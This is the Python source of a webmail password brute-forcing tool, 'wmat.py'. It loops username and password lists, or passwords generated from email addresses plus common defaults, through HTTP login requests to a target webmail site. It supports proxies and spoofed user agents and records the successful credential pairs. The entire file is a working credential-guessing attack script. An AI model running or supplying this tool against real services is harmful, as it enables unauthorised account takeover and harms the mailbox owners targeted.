#!/usr/bin/env python


# Web mail auth tool
# ivanm@security-net.biz

#  [License]
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
#
#  See 'LICENSE' for more information.


# LIBS
import sys, pycurl, xml.dom.minidom, urlparse, time
from optparse import OptionParser, SUPPRESS_USAGE

# DEF ERROR
def error():

    print "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    print "WEB MAIL AUTH TOOL (Ivan Markovic, http://security-net.biz/)”
    print "\nUsage:"
    print "-u usernames_file required (except in passsorter mode)"
    print "-p passwords_file required (except in passsorter mode)"
    print "-t timeout in seconds !required"
    print "-w output_file !required"
    print "--url Webmail URL required"
    print "--pattern pattern_xml required"
    print "--bell Bell on success !required"
    print "--proxy Proxy[IP:PORT] !required"
    print "--proxyup Proxy UP [username:password] !required"
    print "--passsorter File or Email address !required"
    print "-? This help!\n"
    print "Example:"
    print "python wmat.py -u usernames_example.txt -p passwords_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml\n"
    print "python wmat.py -u usernames_example.txt -p passwords_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml --bell -w output_file.txt\n"
    print "python wmat.py -u usernames_example.txt -p passwords_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml --proxy xxx.xxx.xxx.xxx:8080 --proxyup username:password\n"
    print "python wmat.py --passsorter usernames_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml --bell -t 5\n"
    sys.exit()
    
    
# DEF READ FROM FILE
def readFromFile(input):
    try:
        input_file = open(input, "r")
        return input_file.readlines()
    except:
        print "\nERROR: File ",input," is missing!\n"
        sys.exit()
        
        
# DEF READ PATTERN ITEMS
def readPattern():

    global action_url, method, useragent, referer, username_field, password_field, add_fields, success
    
    # Username field
    username_field = getText(pattern.getElementsByTagName("username")[0].childNodes);

    # Password field
    password_field = getText(pattern.getElementsByTagName("password")[0].childNodes);

    # Action URL
    action_url = getText(pattern.getElementsByTagName("action_url")[0].childNodes);

    # Success data
    success = getText(pattern.getElementsByTagName("success")[0].childNodes);

    # HTTP method
    method = getText(pattern.getElementsByTagName("method")[0].childNodes);
    if method == "": 
        method = "post"
        
    # User Agent    
    useragent = str(getText(pattern.getElementsByTagName("useragent")[0].childNodes));
    if useragent == "": 
        useragent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"

    # Additional fields
    add_fields = getText(pattern.getElementsByTagName("additional_fields")[0].childNodes);
    add_fields = add_fields.replace("[amp]","&")

    # Referer
    referer = str(getText(pattern.getElementsByTagName("referer")[0].childNodes));
    referer = referer.replace("[amp]","&")
    

# READ PATTERN
def getText(nodelist):
    rc = ""
    for node in nodelist:
        if node.nodeType == node.TEXT_NODE:
            rc = rc + node.data
    return rc


class CB:
    def __init__(self):
        self.contents = ''
    def body_callback(self, buf):
        self.contents = self.contents + buf


# DEF ATTACK
def attack(ux,px):
    global action_url, method, finded_buf, proxy, proxyUP, useragent, referer, username_field, password_field, add_fields, https, urlx, success
    tempx = ''
    
    t = CB()
    myCurl = pycurl.Curl()
    
    # Proxy
    if proxy <> None:
        myCurl.setopt(pycurl.PROXY, proxy)
        if proxyUP <> None:
            myCurl.setopt(pycurl.PROXYUSERPWD, proxyUP) 
    
    # Https
    if https == 1:
        myCurl.setopt(pycurl.SSLVERSION, 3)
        myCurl.setopt(pycurl.SSL_VERIFYPEER, 0)
        myCurl.setopt(pycurl.VERBOSE, 0)

    # Request login page
    myCurl.setopt(pycurl.USERAGENT, useragent)
    myCurl.setopt(pycurl.FOLLOWLOCATION, 1)
    myCurl.setopt(pycurl.REFERER, referer)
    myCurl.setopt(pycurl.COOKIEFILE, 'temp_cookie.txt')
    myCurl.setopt(pycurl.WRITEFUNCTION, t.body_callback)
    myCurl.setopt(pycurl.CONNECTTIMEOUT, 60)
    myCurl.setopt(pycurl.TIMEOUT, 600)
    
    
    # Create URL/DATA
    LOGIN_DATA = username_field + '=' + ux + '&' + password_field + '=' + px + add_fields
    LOGIN_DATA = LOGIN_DATA.replace("\n","")
    
    if method == 'post': # POST
        urlparse.urlparse(str(LOGIN_DATA))
        
        myCurl.setopt(pycurl.URL, urlx)
        myCurl.setopt(pycurl.POSTFIELDS, str(LOGIN_DATA))
        myCurl.setopt(pycurl.POST, 1)
        
        print "POST url/data: ", urlx, " | ",LOGIN_DATA,"\n"
    else: # GET
        LOGIN_URL = urlx + '?' + LOGIN_DATA
        urlparse.urlparse(str(LOGIN_URL))
        
        myCurl.setopt(pycurl.URL, str(LOGIN_URL))
        
        print "GET url/data: ", LOGIN_URL,"\n"
    
    # Perform
    myCurl.perform()

    # Clean up and close out
    myCurl.close()
    
    # Look at code
    where = t.contents.find(str(success))
    if where <> -1:
        if options.bell:
            print "\a"
        print "Find combination :)\n\n"
        if method == 'post':
            finded_buf += "POST url/data: " + urlx + " | " + LOGIN_DATA + "\n"
        else:
            finded_buf += "GET url/data: " + LOGIN_URL + "\n"    
            
    
# DEF WRITE TO FILE
def writeFile(filename, buffer):
    finded = open(filename,"w")
    finded.write(buffer)
    finded.close

# DEF PasssorterGen 
# Default password generator (Idea: Dejan Levaja <dejan.levaja@netsec.rs>)
def PasssorterGen(x):

    global timeout    
    
    commonPass = ("123", "1234", "12345", "123456", "1234567890", "abc", "a1b2c3", "abc123", "computer", "internet", "password", "P@ssw0rd", "P@ssword", "root", "admin", "administrator", "cisco", "qwerty", "secret", "test", "xxx", "www")
    
    try:
        emails = readFromFile(x)
    except:
        emails = [x]

    for email in emails:
        
        # Only username
        bezdomena = email.split("@")[0].lower()
        
        # Dot
        pazzwords = isThereADot(bezdomena)
        
        # Upper/Caps
        passUpperCaps = UpperAndCaps(pazzwords)
        
        # Numbers
        passNumeric = addNumbersToTheEnd(pazzwords)
        
        all=[]
        for x in (pazzwords):
             all.append(x)
        for x in (passUpperCaps):
            all.append(x)
        for x in (passNumeric):
            all.append(x)
        for x in (commonPass):
            all.append(x.replace("\n",""))
                
        # writeFile(email+".passorter",all)
        for pas in all:
            if timeout > 0:
                time.sleep(timeout)
            attack(email,pas)
            
        
# DEF DOT
def isThereADot(bezdomena):
	# Dot ?
	passwords=[]
	if "." in bezdomena:
		passwords.extend(bezdomena.split("."))
		passwords.append(bezdomena)
	else:
		passwords.append(bezdomena)

	return passwords


# DEF ADD NUMBERS	
def addNumbersToTheEnd(passwords):
	passNumeric=[]
	for lozinka in passwords:
		passNumeric.append(lozinka+"1")
		passNumeric.append(lozinka+"123")
		passNumeric.append(lozinka+"1234")
		passNumeric.append(lozinka+"12345")
		passNumeric.append(lozinka+"123456")
		
	return passNumeric
	

# DEF UPPER AND CAPS
def UpperAndCaps(passwords):
	passUpperAndCaps=[]
	for lozinka in passwords:
		passUpperAndCaps.append(lozinka.upper())
		if "." in lozinka: 
			prvideo = (lozinka.split(".")[0]).capitalize()
			drugideo = (lozinka.split(".")[1]).capitalize()
			passUpperAndCaps.append(prvideo + "." + drugideo)
		else:
			passUpperAndCaps.append(lozinka.capitalize())
		
	return passUpperAndCaps



# ----------------------------------------------------------------------------- #


# M A I N ( )

print "\n"
print "***********************************"
print "***\tweb mail auth tool\t***"
print "***\twmat.py v 0.1\t\t***"
print "***\tcoded by Ivan Markovic\t***"
print "***\thttp://security-net.biz\t***”
print "***\tivanm@security-net.biz\t***”
print "***\twmat.py -? for help\t***"
print "***********************************"

# Args
parser = OptionParser(usage=SUPPRESS_USAGE)
parser.add_option("-u", dest="usernames")
parser.add_option("-p", dest="passwords")
parser.add_option("-t", dest="timeout")
parser.add_option("-w", dest="write")
parser.add_option("--url", dest="url")
parser.add_option("--proxy", dest="proxy")
parser.add_option("--proxyup", dest="proxyup")
parser.add_option("--pattern", dest="pattern")
parser.add_option("--passsorter", dest="passsorter")
parser.add_option("--bell", action="store_true", default=False)
parser.add_option("-?", action="store_true", dest="err")
(options, args) = parser.parse_args()				  

if len(sys.argv) >= 3:
	
    # Uzimam listu korisnickih imena
    if options.usernames:
        usernames = readFromFile(options.usernames)
    else:
        usernames = None

    # Uzimam listu password-a
    if options.passwords:
        passwords = readFromFile(options.passwords)
    else:
        passwords = None

    # URL (host)
    if options.url:
        url = options.url
    else:
        url = None	

    # Pattern
    if options.pattern:
        pattern = xml.dom.minidom.parse(options.pattern)
    else:
        pattern = None		

    # Timeout (sec)
    if options.timeout:
        timeout = float(options.timeout)
    else:
        timeout = 0	
        
    # File to write finded items
    if options.write:
        fwrite = options.write
    else:
        fwrite = None
        
    # Proxy IP:PORT
    if options.proxy:
        proxy = str(options.proxy)
    else:
        proxy = None
        
    # Proxy Username:Password
    if options.proxyup:
        proxyUP = str(options.proxyup)
    else:
        proxyUP = None
        
    # Passorter
    if options.passsorter:
        passorter = options.passsorter
    else:
        passorter = None
        
    if options.err:
        error()
    
else:
	error()


# Check params
if usernames == None or passwords == None or url == None or pattern == None:
    if passorter == None or pattern == None or url == None:
        print "There is some empty value!"
        error()

# Variables
username_field = ""
password_field = ""
action_url = ""
success = ""
method = ""
useragent = ""
add_fields = ""
referer = ""
finded_buf = ""


# https
if url.endswith('https', 0, 5):
    https = 1
else:
    https = 0

# Go #
# -- #

readPattern()

# Full Url (http://someurl.tld/script.ext)
urlx = str(url + action_url)

if passorter <> None:
    PasssorterGen(passorter)
else:
    for username in usernames:
        for password in passwords:
            if timeout > 0:
                time.sleep(timeout)
            attack(username,password)
            

# Make list with finded items
if options.write:
    writeFile(fwrite,finded_buf)
